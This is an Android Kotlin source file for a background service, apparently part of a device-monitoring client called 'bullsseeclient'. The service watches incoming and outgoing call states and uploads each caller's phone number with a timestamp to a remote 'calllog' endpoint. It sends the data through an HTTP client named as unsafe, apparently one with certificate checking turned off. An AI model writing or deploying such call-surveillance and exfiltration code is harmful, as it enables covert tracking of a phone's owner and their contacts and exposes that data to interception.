package com.example.bullsseeclient.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.example.bullsseeclient.HttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.time.Instant

class SmsCallMonitorService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForeground()
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        tm.listen(object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                if (state == TelephonyManager.CALL_STATE_OFFHOOK || state == TelephonyManager.CALL_STATE_RINGING) {
                    sendCallEvent(phoneNumber)
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("CALL_MONITOR", "Call Monitor", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification: Notification = NotificationCompat.Builder(this, "CALL_MONITOR")
            .setContentTitle("Call Monitor")
            .setContentText("Monitoring calls")
            .setSmallIcon(android.R.drawable.stat_sys_phone_call)
            .build()
        startForeground(1001, notification)
    }

    private fun sendCallEvent(number: String?) {
        val retrofit = Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()
        val api = retrofit.create(Api::class.java)
        val payload = listOf(CallDto(number = number, date = Instant.now().toEpochMilli()))
        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
        api.send(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
        })
    }

    interface Api {
        @retrofit2.http.POST("api/DeviceData/calllog")
        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
    }

    data class CallDto(val number: String?, val date: Long)

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, SmsCallMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }
    }
}
